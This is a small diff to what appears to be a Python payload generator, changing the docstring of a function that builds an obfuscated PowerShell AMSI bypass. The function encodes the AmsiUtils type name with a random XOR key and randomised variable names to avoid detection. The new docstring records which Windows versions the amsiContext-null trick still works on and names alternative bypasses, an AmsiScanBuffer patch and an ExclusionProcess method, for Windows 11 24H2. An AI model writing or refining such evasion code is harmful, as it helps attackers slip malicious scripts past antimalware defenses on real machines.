@@ -29,7 +29,9 @@ def split_str(s, chunk=None):
 
 
 def gen_amsi_bypass():
-    """amsiContext null — avoids amsiInitFailed signature."""
+    """amsiContext null — DEAD on Win11 24H2 kernel-mode AMSI (field is already 0 at baseline).
+    Kept for legacy targets (Win10, Server 2019/2022 without kernel-mode AMSI).
+    Use bypass_version=2 (AmsiScanBuffer patch) or bypass_version=3 (ExclusionProcess) for Win11 24H2."""
     vt, vf, vc, vk = rv(), rv(), rv(), rv()
     key = random.randint(10, 120)
     type_enc  = xenc("System.Management.Automation.AmsiUtils", key)
